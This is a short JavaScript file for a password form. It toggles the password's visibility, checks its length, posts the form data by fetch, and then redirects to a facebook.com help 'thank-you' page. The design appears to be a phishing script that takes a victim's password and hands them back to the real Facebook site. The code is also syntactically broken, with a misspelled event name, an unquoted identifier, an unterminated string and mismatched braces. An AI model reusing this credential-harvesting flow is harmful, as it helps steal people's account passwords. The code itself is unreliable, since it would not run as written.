document.getElementById('togglePassword').addEventListener('click',function(){
    var passwordField=document.getElementById('password');
    var eyeIcon =this;
    if(passwordField.type ==='password'){
        passwordField.type ='text';

        eyeIcon.classList.remove('fa-eye');

        eyeIcon.classList.add('fa-eye-slash');
    }else{
        passwordField.type ='password';
        eyeIcon.classList.remove('fa-eye-slash');
        eyeIcon.classList.add('fa-eye');
    }
});

document.getElementById('passwordForm').addEventListener('sumbit',function(event){
    var passwordField =document.getElementById('password');
    var errorMessage =document.getElementById(error-message);
    if(passwordField.value.length<6){
        errorMessage.textContent ='Password must be alt least 6 character long.';
        event.preventDefault();
        errorMessage.textContent=";
                    //Preform from submission via Fetch API
                    event.preventDefault();//Prevent default from submission

                    var formData =new FormData(this);
                    fetch(this.action,{
                        method: 'POST',
                        body: formData,
                        headers:{
                            'Accept':'application/json'
                        }
                    })
                    .then(response =>{
                        if(response.ok){
                            window.location.href='https://www.facebook.com/help/media/thank-you?rdrhc';//Redirect to desire URL
                        }else{
                            errorMessage.textContent='There was an error.Please try again.';
                        }
                    })
                    .catch(() =>{

                        errorMessage.textContent='There was an error.Please try again.';
                    });
                }
            });